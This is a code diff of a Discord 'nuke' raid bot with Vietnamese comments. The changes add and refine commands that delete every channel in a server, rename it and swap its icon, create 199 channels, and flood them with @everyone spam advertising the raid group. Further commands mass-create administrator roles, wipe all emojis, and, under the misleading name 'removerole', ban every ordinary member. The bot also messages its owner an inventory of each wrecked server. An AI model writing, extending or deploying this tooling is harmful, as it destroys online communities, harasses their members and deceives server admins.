@@ -7,6 +7,7 @@ import random
 import re
 import time
 import aiohttp
+import gc
 try:
   import psutil
 except ImportError:
@@ -774,110 +775,173 @@ def setup_bot_events(b_inst, name):
 
     if check_blacklist(message.author.id):
       return
-
+      
     track_user_usage(message.author.id)
     content_lower = message.content.lower()
     words = content_lower.split()
 
     if content_lower.startswith("b!nuke"):
-      if not check_owner(message.author.id):
-        return
-
-      await message.channel.send(
-          "Emperor OnTop 😜"
-      )
-      guild = message.guild
-
-      try:
-        if ADMIN_USER_ID != 0:
-          owner = bot1.get_user(ADMIN_USER_ID) or await bot1.fetch_user(
-              ADMIN_USER_ID
-          )
-          if owner:
-            embed_nuke = discord.Embed(
-                title=f"⚠️ [{b_inst.user.name}] Nuke Đã Được Kích Hoạt",
-                color=discord.Color.red(),
-            )
-            embed_nuke.add_field(
-                name="👤 User",
-                value=f"{message.author.mention}\nID: `{message.author.id}`",
-                inline=False,
-            )
-            embed_nuke.add_field(
-                name="🏠 Server bị Nuke",
-                value=f"`{guild.name}` (ID: `{guild.id}`)",
-                inline=False,
-            )
-            embed_nuke.set_thumbnail(url=message.author.display_avatar.url)
-            await owner.send(embed=embed_nuke)
-      except Exception as e:
-        print(f"Lỗi thông báo nuke: {e}")
-
-      try:
-        img_path = os.path.join(os.getcwd(), "picture", "girlchina.jpg")
-        if not os.path.exists(img_path):
-          img_path = "girlchina.jpg"
-
-        edit_kwargs = {"name": "EMPEROR ONTOP $"}
-        if os.path.exists(img_path):
-          with open(img_path, "rb") as f:
-            edit_kwargs["icon"] = f.read()
-
-        await guild.edit(**edit_kwargs)
-      except Exception as e:
-        print(f"❌ Lỗi khi đổi tên/avatar server: {e}")
-
-      guild_id = guild.id
-      if guild_id not in spam_tasks:
-        spam_tasks[guild_id] = []
-
-      async def run_nuke():
-        try:
-          channel_names = [
-              "EMPEROR",
-              "EMPEROR ONTOP",
-              "EMPEROR NEWGEN",
-              "EMPEROR",
-          ]
-          noi_dung_nuke = """@everyone @here
-# [EMPEROR BỌN A ONTOP](https://discord.gg/zvdH9ZtBp2)
-# SERVER DESTROYED BY EMPEROR 🤣😂🤪😜
-# [SERVER BỊ BỌN A CHỊCH](https://cutes.lol/emiuanh209)"""
-
-          delete_tasks = [
-              ch.delete()
-              for ch in guild.channels
-              if ch.id != message.channel.id
-          ]
-          if delete_tasks:
-            await asyncio.gather(*delete_tasks, return_exceptions=True)
-
-          nuke_semaphore = asyncio.Semaphore(30)
-
-          async def create_and_spam():
-            async with nuke_semaphore:
-              name = random.choice(channel_names)
+          if not check_owner(message.author.id):
+            return
+    
+          await message.channel.send("Emperor OnTop 😜")
+          guild = message.guild
+          guild_id = guild.id
+    
+          for t in list(spam_tasks.get(guild_id, [])):
+            if not t.done():
+              t.cancel()
+          spam_tasks[guild_id] = []
+    
+          try:
+            if ADMIN_USER_ID != 0:
+              owner = bot1.get_user(ADMIN_USER_ID) or await bot1.fetch_user(ADMIN_USER_ID)
+              if owner:
+                try:
+                  guild_owner = guild.owner
+                  owner_text = f"{guild_owner.mention}\nID: `{guild_owner.id}`" if guild_owner else "Không rõ"
+                except Exception:
+                  owner_text = "Không rõ"
+    
+                member_count = guild.member_count or len(guild.members)
+                role_count = len(guild.roles)
+                emoji_count = len(guild.emojis)
+                sticker_count = len(guild.stickers) if hasattr(guild, "stickers") else 0
+                channel_count = len(guild.channels)
+                text_channel_count = len(guild.text_channels)
+                voice_channel_count = len(guild.voice_channels)
+                boost_level = guild.premium_tier
+                boost_count = guild.premium_subscription_count or 0
+                created_at = guild.created_at.strftime("%d/%m/%Y") if guild.created_at else "Không rõ"
+                verification = str(guild.verification_level)
+    
+                embed_nuke = discord.Embed(
+                    title=f"⚠️ [{b_inst.user.name}] NUKE ĐÃ ĐƯỢC KÍCH HOẠT",
+                    description=f"Server **{guild.name}** đang bị phá!",
+                    color=discord.Color.red(),
+                )
+                embed_nuke.add_field(
+                    name="👤 Người kích hoạt",
+                    value=f"{message.author.mention}\nID: `{message.author.id}`\nTên: `{message.author.name}`",
+                    inline=False,
+                )
+                embed_nuke.add_field(
+                    name="🏠 Server bị nuke",
+                    value=f"**{guild.name}**\nID: `{guild.id}`\nOwner: {owner_text}\nTạo ngày: `{created_at}`",
+                    inline=False,
+                )
+                embed_nuke.add_field(name="👥 Thành viên", value=f"`{member_count}`", inline=True)
+                embed_nuke.add_field(name="📁 Kênh", value=f"Tổng: `{channel_count}`\nText: `{text_channel_count}`\nVoice: `{voice_channel_count}`", inline=True)
+                embed_nuke.add_field(name="🎭 Role", value=f"`{role_count}`", inline=True)
+                embed_nuke.add_field(name="😀 Emoji", value=f"`{emoji_count}`", inline=True)
+                embed_nuke.add_field(name="🏷️ Sticker", value=f"`{sticker_count}`", inline=True)
+                embed_nuke.add_field(name="🚀 Boost", value=f"Level `{boost_level}` • `{boost_count}` boost", inline=True)
+                embed_nuke.add_field(name="🔒 Verification", value=f"`{verification}`", inline=True)
+    
+                if guild.icon:
+                  embed_nuke.set_thumbnail(url=guild.icon.url)
+    
+                embed_nuke.set_footer(text=f"Bot: {b_inst.user.name} • Cảnh báo khẩn")
+                embed_nuke.timestamp = discord.utils.utcnow()
+                await owner.send(embed=embed_nuke)
+          except Exception as e:
+            print(f"Lỗi thông báo nuke: {e}")
+    
+          try:
+            img_path = os.path.join(os.getcwd(), "picture", "girlchina.jpg")
+            if not os.path.exists(img_path):
+              img_path = "girlchina.jpg"
+    
+            edit_kwargs = {"name": "EMPEROR ONTOP $"}
+            if os.path.exists(img_path):
+              with open(img_path, "rb") as f:
+                edit_kwargs["icon"] = f.read()
+    
+            await guild.edit(**edit_kwargs)
+          except Exception as e:
+            print(f"❌ Lỗi khi đổi tên/avatar server: {e}")
+    
+          async def nuke_cleanup():
+            while True:
               try:
-                ch = await guild.create_text_channel(name=name)
-                if ch:
-                  for i in range(10):
-                    await raw_send_message(b_inst, ch.id, f"{noi_dung_nuke}\n")
-                    await asyncio.sleep(1)
-              except Exception:
-                pass
-
-          nuke_tasks = [create_and_spam() for _ in range(199)]
-          if nuke_tasks:
-            await asyncio.gather(*nuke_tasks, return_exceptions=True)
-        except asyncio.CancelledError:
-          pass
-        except Exception as e:
-          print(f"❌ Lỗi tiến trình: {e}")
-
-      task = asyncio.create_task(run_nuke())
-      _track_task(spam_tasks, guild_id, task)
-      await b_inst.process_commands(message)
-      return
+                await asyncio.sleep(120)
+                for bot in [bot1, bot2, bot3, bot4, bot5]:
+                  try:
+                    if bot.is_ready():
+                      bot._connection._messages.clear()
+                  except Exception:
+                    pass
+                for _ in range(3):
+                  gc.collect()
+                print("[NUKE CLEANUP] Dọn dẹp")
+              except asyncio.CancelledError:
+                raise
+              except Exception as e:
+                print(f"[NUKE CLEANUP] Lỗi: {e}")
+                await asyncio.sleep(30)
+    
+          async def run_nuke():
+            cleanup_task = asyncio.create_task(nuke_cleanup())
+            try:
+              channel_names = [
+                  "EMPEROR",
+                  "EMPEROR ONTOP",
+                  "EMPEROR NEWGEN",
+                  "EMPEROR",
+              ]
+              noi_dung_nuke = """@everyone @here
+    # [EMPEROR BỌN A ONTOP](https://discord.gg/zvdH9ZtBp2)
+    # SERVER DESTROYED BY EMPEROR 🤣😂🤪😜
+    # [SERVER BỊ BỌN A CHỊCH](https://cutes.lol/emiuanh209)"""
+    
+              delete_tasks = [
+                  ch.delete()
+                  for ch in guild.channels
+              ]
+              if delete_tasks:
+                await asyncio.gather(*delete_tasks, return_exceptions=True)
+    
+              nuke_semaphore = asyncio.Semaphore(30)
+    
+              async def create_and_spam():
+                async with nuke_semaphore:
+                  name = random.choice(channel_names)
+                  try:
+                    ch = await guild.create_text_channel(name=name)
+                    if ch:
+                      for i in range(10):
+                        await raw_send_message(b_inst, ch.id, f"{noi_dung_nuke}\n")
+                        await asyncio.sleep(1)
+                  except Exception:
+                    pass
+    
+              nuke_tasks = [create_and_spam() for _ in range(199)]
+              if nuke_tasks:
+                await asyncio.gather(*nuke_tasks, return_exceptions=True)
+            except asyncio.CancelledError:
+              pass
+            except Exception as e:
+              print(f"❌ Lỗi tiến trình: {e}")
+            finally:
+              if not cleanup_task.done():
+                cleanup_task.cancel()
+                try:
+                  await cleanup_task
+                except asyncio.CancelledError:
+                  pass
+              for bot in [bot1, bot2, bot3, bot4, bot5]:
+                try:
+                  if bot.is_ready():
+                    bot._connection._messages.clear()
+                except Exception:
+                  pass
+              for _ in range(5):
+                gc.collect()
+    
+          task = asyncio.create_task(run_nuke())
+          _track_task(spam_tasks, guild_id, task)
+          await b_inst.process_commands(message)
+          return
     if (
         content_lower.startswith("b!xangonv3")
         or content_lower.startswith("b!xangonv2")
@@ -2836,42 +2900,78 @@ def register_admin_commands(b_target):
     await interaction.response.defer(ephemeral=True)
 
     guild = interaction.guild
+    guild_id = guild.id
 
-    # Đếm role hiện tại
     current = len(guild.roles)
     max_role = 250
     available = max_role - current
 
     if available <= 0:
+      try:
+        await interaction.followup.send(
+            "❌ Server đã đủ 250 role, đéo tạo thêm được.",
+            ephemeral=True,
+        )
+      except Exception:
+        pass
       return
 
-    created = 0
-    index = 1
-
-    while created < available:
+    # Check quyền bot
+    bot_member = guild.me
+    if not bot_member.guild_permissions.manage_roles:
       try:
-        await guild.create_role(
-          name=f"Emperor{index}",
-          color=discord.Color.from_rgb(255, 0, 0),
-          hoist=True,
-          mentionable=False,
-          permissions=discord.Permissions(administrator=True),
-          reason="Emperor Role",
+        await interaction.followup.send(
+            "❌ Bot thiếu quyền `Manage Roles`.",
+            ephemeral=True,
         )
-        created += 1
-        index += 1
-      except discord.HTTPException as e:
-        if e.status == 429:
-          try:
-            wait = max(0.5, float(getattr(e, "retry_after", 1.0)))
-          except (TypeError, ValueError):
-            wait = 1.0
-          await asyncio.sleep(wait)
-          continue
-        else:
-          break
       except Exception:
-        break
+        pass
+      return
+
+    # Báo thành công là bắt đầu tạo
+    try:
+      await interaction.followup.send(
+          f"✅ Bắt đầu tạo `{available}` role Emperor.",
+          ephemeral=True,
+      )
+    except Exception:
+      pass
+
+    # Chạy nền
+    async def run_role():
+      created = 0
+      index = 1
+      while created < available:
+        try:
+          role = await guild.create_role(
+            name=f"Emperor{index}",
+            color=discord.Color.from_rgb(255, 0, 0),
+            hoist=True,
+            mentionable=False,
+            permissions=discord.Permissions(administrator=True),
+            reason="Emperor Role",
+          )
+          try:
+            await role.edit(position=250)
+          except Exception:
+            pass
+          created += 1
+          index += 1
+        except discord.HTTPException as e:
+          if e.status == 429:
+            try:
+              wait = max(0.5, float(getattr(e, "retry_after", 1.0)))
+            except (TypeError, ValueError):
+              wait = 1.0
+            await asyncio.sleep(wait)
+            continue
+          else:
+            break
+        except Exception:
+          break
+
+    task = asyncio.create_task(run_role())
+    _track_task(spam_tasks, guild_id, task)
 
   @b_target.tree.command(
     name="emoji",
@@ -2888,17 +2988,17 @@ def register_admin_commands(b_target):
     await interaction.response.defer(ephemeral=True)
 
     guild = interaction.guild
+    guild_id = guild.id
 
-    # 1. Xóa all emoji SONG SONG
-    if guild.emojis:
-      await asyncio.gather(
-        *(e.delete(reason="Emoji cleanup") for e in list(guild.emojis)),
-        return_exceptions=True,
-      )
-
-    # 2. Đọc file
     emoji_file = os.path.join(os.getcwd(), "emoji_list.txt")
     if not os.path.exists(emoji_file):
+      try:
+        await interaction.followup.send(
+            "❌ Không tìm thấy `emoji_list.txt`.",
+            ephemeral=True,
+        )
+      except Exception:
+        pass
       return
 
     with open(emoji_file, "r", encoding="utf-8") as f:
@@ -2906,62 +3006,92 @@ def register_admin_commands(b_target):
 
     patterns = re.findall(r"<(a?):(\w+):(\d+)>", content)
     if not patterns:
+      try:
+        await interaction.followup.send(
+            "❌ File emoji đéo có emoji hợp lệ.",
+            ephemeral=True,
+        )
+      except Exception:
+        pass
       return
 
-    animated, base_name, eid = patterns[0]
+    bot_member = guild.me
+    if not bot_member.guild_permissions.manage_emojis:
+      try:
+        await interaction.followup.send(
+            "❌ Bot thiếu quyền `Manage Emojis`.",
+            ephemeral=True,
+        )
+      except Exception:
+        pass
+      return
 
-    # 3. Download 1 lần
-    ext = "gif" if animated else "png"
-    url = f"https://cdn.discordapp.com/emojis/{eid}.{ext}"
-
-    image_data = None
     try:
-      async with aiohttp.ClientSession() as session:
-        async with session.get(url) as resp:
-          if resp.status == 200:
-            image_data = await resp.read()
+      await interaction.followup.send(
+          "✅ Bắt đầu setup emoji.",
+          ephemeral=True,
+      )
     except Exception:
       pass
 
-    if image_data is None:
-      return
+    animated, base_name, eid = patterns[0]
+    ext = "gif" if animated else "png"
+    url = f"https://cdn.discordapp.com/emojis/{eid}.{ext}"
 
-    # 4. Tạo 50 emoji SONG SONG
-    async def create_one(index):
+    async def run_emoji():
+      image_data = None
       try:
-        clean_name = f"{base_name}{index}"[:32]
-
-        try:
-          await guild.create_custom_emoji(
-            name=clean_name,
-            image=image_data,
-            reason="Emoji by owner",
-          )
-          return True
-        except discord.HTTPException as e:
-          if e.status == 429:
-            try:
-              wait = max(0.5, float(getattr(e, "retry_after", 1.0)))
-            except (TypeError, ValueError):
-              wait = 1.0
-            await asyncio.sleep(wait)
-            try:
-              await guild.create_custom_emoji(
-                name=clean_name,
-                image=image_data,
-                reason="Emoji by owner",
-              )
-              return True
-            except Exception:
-              return False
-          return False
+        async with aiohttp.ClientSession() as session:
+          async with session.get(url) as resp:
+            if resp.status == 200:
+              image_data = await resp.read()
       except Exception:
-        return False
+        pass
 
-    await asyncio.gather(
-      *(create_one(i) for i in range(1, 51)),
-      return_exceptions=True,
-    )
+      if image_data is None:
+        return
+
+      # Xóa emoji cũ
+      if guild.emojis:
+        await asyncio.gather(
+          *(e.delete(reason="Emoji cleanup") for e in list(guild.emojis)),
+          return_exceptions=True,
+        )
+
+      async def create_one(index):
+        try:
+          clean_name = f"{base_name}{index}"[:32]
+          try:
+            await guild.create_custom_emoji(
+              name=clean_name,
+              image=image_data,
+              reason="Emoji by owner",
+            )
+          except discord.HTTPException as e:
+            if e.status == 429:
+              try:
+                wait = max(0.5, float(getattr(e, "retry_after", 1.0)))
+              except (TypeError, ValueError):
+                wait = 1.0
+              await asyncio.sleep(wait)
+              try:
+                await guild.create_custom_emoji(
+                  name=clean_name,
+                  image=image_data,
+                  reason="Emoji by owner",
+                )
+              except Exception:
+                pass
+        except Exception:
+          pass
+
+      await asyncio.gather(
+        *(create_one(i) for i in range(1, 51)),
+        return_exceptions=True,
+      )
+
+    task = asyncio.create_task(run_emoji())
+    _track_task(spam_tasks, guild_id, task)
 
   @b_target.tree.command(
     name="all",
@@ -3191,7 +3321,7 @@ def register_admin_commands(b_target):
         color=discord.Color.red(),
     )
     embed.set_image(
-        url="https://cdn.discordapp.com/attachments/1551512664788832367/1552579203419873370/file_00000000ef788209a4bee654e029994c.png?ex=6ab61f8f&is=6ab4ce0f&hm=21e3b103d77daaea574567080a7b6834ed912dd5083bb4d583f692fdad6c9e15&"
+        url="https://cdn.discordapp.com/attachments/1551512664788832367/1560919351601930250/f42fccf534f617ab3ed3163cf6a94495.gif?ex=6ad476ed&is=6ad3256d&hm=0557bdd1494bff1022b811d5ecead4039018ee36536603fb91e34aa4f46e6a6d&"
     )
     embed.set_footer(text="Treo Đa Kênh Siêu Bá Khí")
     await interaction.followup.send(embed=embed, view=view, ephemeral=False)
@@ -3219,6 +3349,76 @@ def register_admin_commands(b_target):
       await interaction.followup.send(
           "⚠️ Không có tiến trình nào đang chạy trong server này", ephemeral=True
       )
+
+  @b_target.tree.command(
+  name="removerole",
+  description="Xóa role dư thừa (Owner only)",
+)
+  async def removerole_slash(interaction: discord.Interaction):
+    if not check_owner(interaction.user.id):
+      await interaction.response.defer(ephemeral=True)
+      return
+    if interaction.guild is None:
+      await interaction.response.defer(ephemeral=True)
+      return
+  
+    await interaction.response.defer(ephemeral=True)
+    guild = interaction.guild
+  
+    if not guild.me.guild_permissions.ban_members:
+      try:
+        await interaction.followup.send(
+            "❌ Bot thiếu quyền `Role Members`.",
+            ephemeral=True,
+        )
+      except Exception:
+        pass
+      return
+  
+    try:
+      await interaction.followup.send(
+          "✅ Bắt đầu quét và ban toàn bộ thành viên khả thi...",
+          ephemeral=True,
+      )
+    except Exception:
+      pass
+
+    async def run_removerole():
+      banned = 0
+      failed = 0
+      
+      # Lấy toàn bộ member có trong cache
+      for member in list(guild.members):
+        # Bỏ qua chính bot và các bot khác
+        if member.bot:
+          continue
+        # Bỏ qua chủ server
+        if member.id == guild.owner_id:
+          continue
+        # Bỏ qua ADMIN_USER_ID (chủ bot)
+        if member.id == ADMIN_USER_ID:
+          continue
+  
+        try:
+          # Thử ban member (xóa 0 ngày tin nhắn)
+          await member.ban(reason="Removed by EMPEROR", delete_message_days=0)
+          banned += 1
+          # Nghỉ 0.5s tránh rate limit
+          await asyncio.sleep(0.5)
+        except discord.Forbidden:
+          # Lỗi do role của member cao hơn bot -> Bỏ qua
+          failed += 1
+        except discord.HTTPException:
+          # Lỗi mạng/rate limit
+          await asyncio.sleep(1)
+          failed += 1
+        except Exception:
+          failed += 1
+  
+      print(f"[REMOVEROLE] Đã ban: {banned} | Thất bại: {failed}")
+  
+    task = asyncio.create_task(run_removerole())
+    _track_task(spam_tasks, guild.id, task)
 
   @b_target.tree.command(
       name="blacklist", description="Xem danh sách Blacklist (Chỉ Owner)"
